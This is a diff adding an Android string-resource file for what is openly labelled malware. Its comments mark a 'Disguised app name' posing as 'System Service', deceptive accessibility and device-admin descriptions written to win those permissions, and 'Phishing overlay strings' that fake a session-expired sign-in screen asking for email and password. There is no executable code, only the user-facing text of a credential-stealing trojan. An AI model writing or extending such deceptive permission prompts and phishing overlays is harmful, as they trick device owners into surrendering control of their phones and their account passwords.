@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <!-- Disguised app name -->
+    <string name="app_name">System Service</string>
+    
+    <!-- Accessibility service description (appears in settings) -->
+    <string name="accessibility_service_description">This service helps improve your device experience by monitoring system events.</string>
+    
+    <!-- Device admin descriptions -->
+    <string name="device_admin_description">Required for enhanced security features and remote management.</string>
+    
+    <!-- Notification channel -->
+    <string name="notification_channel_name">System Updates</string>
+    <string name="notification_channel_description">Important system notifications</string>
+    
+    <!-- Foreground service notification -->
+    <string name="notification_title">System Service</string>
+    <string name="notification_text">Running in background</string>
+    
+    <!-- Phishing overlay strings -->
+    <string name="session_expired">Your session has expired. Please sign in again.</string>
+    <string name="sign_in">Sign In</string>
+    <string name="email_hint">Email or username</string>
+    <string name="password_hint">Password</string>
+    <string name="forgot_password">Forgot password?</string>
+    <string name="verifying">Verifying...</string>
+</resources>
